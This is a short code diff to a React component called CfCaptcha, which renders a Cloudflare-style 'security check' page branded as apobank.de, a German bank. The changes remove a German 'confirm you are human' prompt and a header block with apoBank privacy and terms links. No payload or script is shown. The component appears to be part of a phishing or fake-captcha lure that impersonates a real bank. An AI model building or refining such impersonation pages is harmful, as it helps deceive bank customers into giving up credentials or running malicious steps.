@@ -153,9 +153,6 @@ const CfCaptcha = () => {
             <div className="h-9 w-9 rounded-full bg-white border border-slate-200 flex items-center justify-center text-[#001f5b] font-bold">a</div>
             <h1 className="text-[26px] font-semibold text-[#0f172a] leading-none">apobank.de</h1>
           </div>
-          <p className="text-[15px] text-slate-700 mb-4">
-            Bitte bestätigen Sie durch die untenstehende Aktion, dass Sie ein Mensch sind.
-          </p>
 
           <div className="rounded-xl overflow-hidden border border-slate-200 bg-white shadow-2xl">
             <header className="flex items-center justify-between px-6 py-5 bg-white border-b border-slate-100">
@@ -165,12 +162,8 @@ const CfCaptcha = () => {
                   Sicherheitsüberprüfung
                 </h2>
               </div>
-              <div className="text-right text-[11px] leading-tight text-slate-500">
-                <div className="text-[#001f5b] font-medium">apoBank</div>
-                <div>Vertraulichkeit</div>
-                <div>Nutzungsbedingungen</div>
-              </div>
             </header>
+
 
             <div className="bg-[#f5f7fa] px-6 py-8">
               <p className="text-[14px] text-[#0f172a] mb-3">
